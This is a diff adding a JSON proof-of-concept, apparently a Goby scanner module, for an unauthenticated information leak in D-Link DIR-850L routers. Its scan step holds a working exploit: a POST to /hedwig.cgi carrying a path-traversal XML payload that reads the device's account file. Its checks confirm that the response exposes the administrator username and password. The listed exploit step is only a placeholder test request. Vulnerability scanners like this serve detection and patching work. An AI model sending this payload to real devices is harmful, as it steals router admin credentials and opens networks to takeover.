@@ -1,0 +1,116 @@
+{
+      "Name": "Dlink 850L Info Leak",
+      "Level": "3",
+      "Tags": [
+            "infoleak"
+      ],
+      "GobyQuery": "(app=\"DIR-850L\" | title==\"DIR-850L\")",
+      "Description": "D-Link 850L 发现可以未授权加载 htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php 文件并获得管理员账号密码等敏感信息",
+      "Product": "DIR-850L",
+      "Homepage": "http://www.dlink.com.cn/",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://xz.aliyun.com/t/2941"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/hedwig.cgi",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "text/xml",
+                              "Cookie": "uid=R8tBjwtFc7"
+                        },
+                        "data_type": "text",
+                        "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "&lt;/usrid&gt;",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "&lt;/password&gt;",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "&lt;result&gt;OK&lt;/result&gt;",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/test.php",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-24 19:23:42",
+      "GobyVersion": "1.8.302"
+}
